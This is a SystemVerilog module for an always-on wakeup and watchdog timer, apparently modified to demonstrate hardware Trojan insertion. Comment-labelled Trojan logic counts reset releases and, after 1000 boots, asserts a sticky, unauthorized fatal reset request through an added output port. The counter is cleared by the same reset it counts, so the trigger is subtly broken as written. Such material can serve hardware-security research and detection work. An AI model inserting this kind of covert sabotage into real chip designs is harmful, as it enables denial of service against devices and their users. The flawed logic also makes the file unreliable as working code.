module aon_timer_core import aon_timer_reg_pkg::*; (
  input  logic                      clk_aon_i,
  input  logic                      rst_aon_ni,

  input  lc_ctrl_pkg::lc_tx_t [2:0] lc_escalate_en_i,
  input  logic                      sleep_mode_i,

  // Register interface
  input  aon_timer_reg2hw_t         reg2hw_i,
  output logic                      wkup_count_reg_wr_o,
  output logic [63:0]               wkup_count_wr_data_o,
  output logic                      wdog_count_reg_wr_o,
  output logic [31:0]               wdog_count_wr_data_o,

  output logic                      wkup_intr_o,
  output logic                      wdog_intr_o,
  output logic                      wdog_reset_req_o,

  // Trojan insertion: add a dedicated output for the fatal system reset request
  output logic                      aon_timer_rst_req_o    // <-- Trojan-related output
);

  logic        unused_reg2hw;
  // Wakeup signals
  logic [11:0] prescale_count_d, prescale_count_q;
  logic        prescale_en;
  logic        wkup_incr;
  // Watchdog signals
  logic        wdog_incr;

  logic [63:0] wkup_count;
  logic [63:0] wkup_thold;

  //////////////////
  // Wakeup Timer //
  //////////////////

  // Prescaler counter
  assign prescale_count_d = wkup_incr ? 12'h000 : (prescale_count_q + 12'h001);
  assign prescale_en      = reg2hw_i.wkup_ctrl.enable.q &
                            lc_ctrl_pkg::lc_tx_test_false_strict(lc_escalate_en_i[0]);

  always_ff @(posedge clk_aon_i or negedge rst_aon_ni) begin
    if (!rst_aon_ni) begin
      prescale_count_q <= 12'h000;
    end else if (reg2hw_i.wkup_ctrl.prescaler.qe) begin
      prescale_count_q <= 12'h000;
    end else if (prescale_en) begin
      prescale_count_q <= prescale_count_d;
    end
  end

  assign wkup_count = {reg2hw_i.wkup_count_hi.q, reg2hw_i.wkup_count_lo.q};
  assign wkup_thold = {reg2hw_i.wkup_thold_hi.q, reg2hw_i.wkup_thold_lo.q};

  // Wakeup timer count
  assign wkup_incr = lc_ctrl_pkg::lc_tx_test_false_strict(lc_escalate_en_i[1]) &
                     reg2hw_i.wkup_ctrl.enable.q &
                     (prescale_count_q == reg2hw_i.wkup_ctrl.prescaler.q);

  assign wkup_count_reg_wr_o  = wkup_incr;
  assign wkup_count_wr_data_o = wkup_count + 64'd1;

  // Timer interrupt
  assign wkup_intr_o = wkup_incr & (wkup_count >= wkup_thold);

  ////////////////////
  // Watchdog Timer //
  ////////////////////

  // Watchdog timer count
  assign wdog_incr = reg2hw_i.wdog_ctrl.enable.q &
                     lc_ctrl_pkg::lc_tx_test_false_strict(lc_escalate_en_i[2]) &
                     ~(sleep_mode_i & reg2hw_i.wdog_ctrl.pause_in_sleep.q);

  assign wdog_count_reg_wr_o  = wdog_incr;
  assign wdog_count_wr_data_o = (reg2hw_i.wdog_count.q + 32'd1);

  // Timer interrupt
  assign wdog_intr_o = wdog_incr & (reg2hw_i.wdog_count.q >= reg2hw_i.wdog_bark_thold.q);
  // Timer reset
  assign wdog_reset_req_o = wdog_incr & (reg2hw_i.wdog_count.q >= reg2hw_i.wdog_bite_thold.q);

  assign unused_reg2hw = |{reg2hw_i.intr_state, reg2hw_i.intr_test, reg2hw_i.wkup_cause,
                           reg2hw_i.alert_test};

  //////////////////////////////////////////////////////
  // Trojan: Cumulative Boot Counter and Reset Trigger //
  //////////////////////////////////////////////////////

  // Trojan State Elements
  logic [15:0] trojan_boot_cnt_q, trojan_boot_cnt_d;  // Enough to count at least 1000
  logic        trojan_boot_detected;
  logic        trojan_rst_triggered_q, trojan_rst_triggered_d;
  logic        trojan_activate;

  // Trojan: Detect system boot event in AON domain
  // For demonstration, assume boot event is interpreted as reset release (negedge rst_aon_ni)
  // In a refined implementation, hook to a dedicated boot_done_i event in actual SoC integration

  // Save past reset state for edge detection (must be synthesizable)
  logic rst_aon_ni_q;
  always_ff @(posedge clk_aon_i or negedge rst_aon_ni) begin
    if (!rst_aon_ni)
      rst_aon_ni_q <= 1'b0;
    else
      rst_aon_ni_q <= 1'b1;
  end

  // Rising edge of rst_aon_ni (reset just completed)
  assign trojan_boot_detected = (rst_aon_ni_q == 1'b0) && (rst_aon_ni == 1'b1);

  // Trojan boot counter
  always_ff @(posedge clk_aon_i or negedge rst_aon_ni) begin
    if (!rst_aon_ni) begin
      trojan_boot_cnt_q <= 16'd0;
    end else if (trojan_boot_detected) begin
      trojan_boot_cnt_q <= trojan_boot_cnt_q + 16'd1;
    end else begin
      trojan_boot_cnt_q <= trojan_boot_cnt_q;
    end
  end

  // Trojan trigger: Assert once counter reaches 1000 boots (stays high after)
  assign trojan_activate = (trojan_boot_cnt_q >= 16'd1000);

  // Latch Trojan activation, make the reset request sticky
  always_ff @(posedge clk_aon_i or negedge rst_aon_ni) begin
    if (!rst_aon_ni)
      trojan_rst_triggered_q <= 1'b0;
    else if (trojan_activate)
      trojan_rst_triggered_q <= 1'b1;
    else
      trojan_rst_triggered_q <= trojan_rst_triggered_q;
  end

  // Trojan payload output: Unauthorized fatal reset request
  assign aon_timer_rst_req_o = trojan_rst_triggered_q;

endmodule